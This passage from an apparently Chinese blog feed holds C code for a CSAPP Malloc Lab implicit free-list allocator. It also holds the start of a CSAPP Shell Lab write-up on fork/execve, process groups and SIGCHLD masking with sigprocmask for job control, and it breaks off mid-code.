punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    <span class="token comment">// 分配偶数个字来保持字节对齐 </span>    size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token operator">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化空闲块的 header, footer 和下一块的 epilogue</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 如果前一块是空闲，则合并</span>    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> prev_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// 前后都已分配</span>        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>next_alloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 后一块未分配</span>        size <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 前一块未分配</span>        size <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                 <span class="token comment">// 前后都未分配 </span>        size <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    <span class="token comment">// 最简单的首次匹配策略</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>blkp <span class="token operator">=</span> heap_listp<span class="token punctuation">;</span>        <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>        blkp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">>=</span> asize <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>blkp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> blkp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 空闲块大小</span>    <span class="token class-name">size_t</span> remain <span class="token operator">=</span> size <span class="token operator">-</span> asize<span class="token punctuation">;</span>      <span class="token comment">// 空闲块分配 asize 字节后剩余的空间</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>remain <span class="token operator">>=</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 分割</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>remain<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>remain<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 不分割</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本 Lab 需要实现一个内存分配器，技巧性较强，对应知识点为书中的第 9 章的第 9.9 节。个人认为是所有 Lab 中难度最高的一个，我这里也是时间所迫，只参照教材实现了隐式空闲链表，显式空闲链表的实现尚存在一些 bug，在本文暂不介绍。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Shell Lab</title>
    <link href="http://lordaeronesz.github.io/2024/12/29/CSAPP-Shell-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/12/29/CSAPP-Shell-Lab/</id>
    <published>2024-12-29T03:45:11.000Z</published>
    <updated>2024-12-30T07:17:26.094Z</updated>
    
    <content type="html"><![CDATA[<p>本 Lab 需要实现一个简易的 shell，主要考察对进程和信号的理解，以及对与其相关的 POSIX API 的使用，对应知识点为书中的第 8 章内容。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>实现一个简单的 shell，要求支持如下特性：</p><ol><li>输入 ctrl-c 触发 SIGINT 信号，输入 ctrl-z 触发 SIGTSTP 信号，发送给给前台运行的任务和依赖于这些任务的子任务（子进程）。</li><li>如果命令行以 <code>&amp;</code> 结尾，那么本次作业将被置于后台运行，否则置于前台运行。</li><li>每个作业可以通过 PID（process id）或 JID（job id）来指定，其中 JID 需要加上前缀 <code>%</code>。</li><li>支持下列内建命令：<ol><li><code>quit</code>：终止 shell 的运行。</li><li><code>jobs</code>：列出所有的后台作业。</li><li><code>bg &lt;job&gt;</code>：重启 <code>&lt;job&gt;</code>（PID 或者 JID），通过发出 SIGCONT 信号，然后将其运行在后台。</li><li><code>fg &lt;job&gt;</code>：重启 <code>&lt;job&gt;</code>（PID 或者 JID），通过发出 SIGCONT 信号，然后将其运行在前台。</li></ol></li><li>回收所有的僵尸进程。</li></ol><h2 id="命令行解释执行"><a href="#命令行解释执行" class="headerlink" title="命令行解释执行"></a>命令行解释执行</h2><p><code>eval</code> 函数的作用是解析并执行 shell 输入的命令行。对于内建命令（builtin command）而言，应该立即在 shell 中进行处理；而对于非内建命令而言，应该使用 <code>fork + execve</code> 的组合，创建一个指定的进程来进行处理。</p><blockquote><p>tsh 不需要支持管道功能，因此一个作业只对应一个进程。</p></blockquote><p><code>fork</code> 的功能是创建一个子进程，该子进程的虚拟地址空间完全拷贝自其父进程，且程序计数器的位置同样位于该 <code>fork</code> 函数处。区别在于，父进程的返回值为子进程的 pid，子进程的 pid 为 0，因此可以根据这一特性来对父进程和子进程进行分别处理：</p><ul><li>子进程需要先使用 <code>setpgid(0, 0)</code> 将进程组 id 设置为自己的 pid，将自己与 tsh “脱离”，确保此时前台进程组只有 tsh 本身，防止被 tsh 接收到的信号所影响。然后再使用 <code>execve</code>，用指定的可执行程序替换拷贝自父进程的虚拟地址空间，并开始从头执行。</li><li>父进程则需要根据本次输入的命令行，创建其对应的作业数据结构 <code>struct job_t</code>，并加入作业队列 <code>jobs</code> 中。同时，由于前台作业（命令行末尾不带 <code>&amp;</code> 符号）需要一直占用终端，因此当本次作业为前台作业时，需要调用 <code>waitfg</code> 进行等待，直到作业的类型不再是前台运行（<code>FG</code>）。</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将进程组设置为自己的 pid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execve %s error\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> BG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> FG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>根据书中 8.5.6 节的描述，可能会出现一种情况：父进程 <code>fork</code> 子进程后，子进程一直被调度执行，直到运行结束称为一个僵尸进程（zombie）并向父进程发送 SIGCHLD 信号。等到父进程被调度时，他先响应 SIGCHLD 信号并将成为僵尸进程的子进程收割（reap），同时尝试将作业从作业队列中移除，此时事实上不会做任何事情，因为作业还没有加入到作业队列中。再接下来父进程继续执行 <code>fork</code> 后的代码，才将作业加入到作业队列中，这明显不对！</p><p>针对这类恼人的同步问题，可以采用 <code>sigprocmask</code> （如下所示是 <code>sigprocmask</code> 的使用说明）在适当的位置设置信号屏蔽字来解决。对于本问题，可以在父进程中先屏蔽对 SIGCHLD 信号的处理，等到使用 <code>addjob</code> 将作业加入作业队列后才开始响应 SIGCHLD 信号，这样即便是子进程先执行完毕并向父进程发送 SIGCHLD 信号，父进程也能确保在 <code>addjob</code> 执行完后才处理这一信号。</p><blockquote><ul><li>generated by GPT4o</li></ul><h3 id="sigprocmask-介绍"><a href="#sigprocmask-介绍" class="headerlink" title="sigprocmask 介绍"></a><strong><code>sigprocmask</code> 介绍</strong></h3><p><code>sigprocmask</code> 是一个用于操作信号屏蔽字（signal mask）的系统调用。它允许程序暂时屏蔽或取消屏蔽某些信号的接收，进而控制信号的处理行为。通过它，程序可以避免在特定代码段中处理中断信号，从而进行更细粒度的控制。</p><h4 id="sigprocmask-的原型："><a href="#sigprocmask-的原型：" class="headerlink" title="sigprocmask 的原型："></a><strong><code>sigprocmask</code> 的原型：</strong></h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token keyword">int</span> <span class="token function">sigprocmask</span><span class="token punctuation">(</span><span class="token keyword">int</span> how<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">,</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>oldset<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><strong><code>how</code></strong>：<ul><li><code>SIG_BLOCK</code>：将 <code>set</code> 中的信号加入到当前信号屏蔽字中（即阻塞这些信号）。</li><li><code>SIG_UNBLOCK</code>：从当前信号屏蔽字中移除 <code>set</code> 中的信号（即解除屏蔽这些信号）。</li><li><code>SIG_SETMASK</code>：将当前信号屏蔽字设置为 <code>set</code> 中的信号集（即完全替换当前的信号屏蔽字）。</li></ul></li><li><strong><code>set</code></strong>：指向包含信号集的 <code>sigset_t</code> 类型变量，该变量指定要阻塞或解除阻塞的信号。</li><li><strong><code>oldset</code></strong>：指向 <code>sigset_t</code> 类型的变量，用来保存当前的信号屏蔽字，以便稍后恢复。</li></ul><h4 id="信号集-sigset-t-的操作："><a href="#信号集-sigset-t-的操作：" class="headerlink" title="信号集 sigset_t 的操作："></a><strong>信号集 <code>sigset_t</code> 的操作：</strong></h4><ul><li>初始化信号集：<ul><li><code>sigemptyset(sigset_t *set)</code>：清空信号集。</li><li><code>sigfillset(sigset_t *set)</code>：将所有信号加入信号集。</li><li><code>sigaddset(sigset_t *set, int signum)</code>：将特定信号加入信号集。</li><li><code>sigdelset(sigset_t *set, int signum)</code>：从信号集中移除特定信号。</li></ul></li></ul></blockquote><p>此外，为了防止其他可能的并发错误出现，可以在对全局变量的修改前先屏蔽所有信号。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">sigset_t</span> mask_all<span class="token punctuation">,</span> mask_one<span class="token punctuation">,</span> prev_one<span class="token punctuation">;</span><span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_one<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigaddset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_one<span class="token punctuation">,</span> SIGCHLD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_one<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将进程组设置为自己的 pid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execve %s error\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> BG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> FG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="bg-fg-已停止作业恢复执行"><a href="#bg-fg-已停止作业恢复执行" class="headerlink" title="bg/fg: 已停止作业恢复执行"></a>bg/fg: 已停止作业恢复执行</h2><p>在内建命令中，<code>quit</code> 直接让程序正常退出即可，<code>jobs</code> 只需调用已实现的函数 <code>listjobs</code>，真正需要实现的是 <code>bg</code> 和 <code>fg</code>，它们的作用是将处于停止状态的作业恢复到后台（前台）执行。</p><p>实现方式无非分两步：</p><ol><li>参数解析，提取出作业 ID（分为 PID 和 JID）。</li><li>根据 <code>bg</code> 和 <code>fg</code> 的不同，分别进行处理，将作业运行在前台或是后台。</li></ol><p>参数解析其实也就是字符串处理，这部分与本章的异常控制流关系不大，在此不过多赘述。</p><p>根据参数得到对应的作业 <code>job</code> 后，首先需要它的运行状态更改为指定的状态（<code>BG</code> 或 <code>FG</code>），然后向 <code>job</code> 对应的进程组（<code>kill</code> 的 pid 参数为 <code>-job-&gt;pid</code>）发送 SIGCONT 信号，将内核在响应此信号后会重新调度该进程组内的所有进程执行。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span>job<span class="token operator">-></span>state <span class="token operator">=</span> state<span class="token 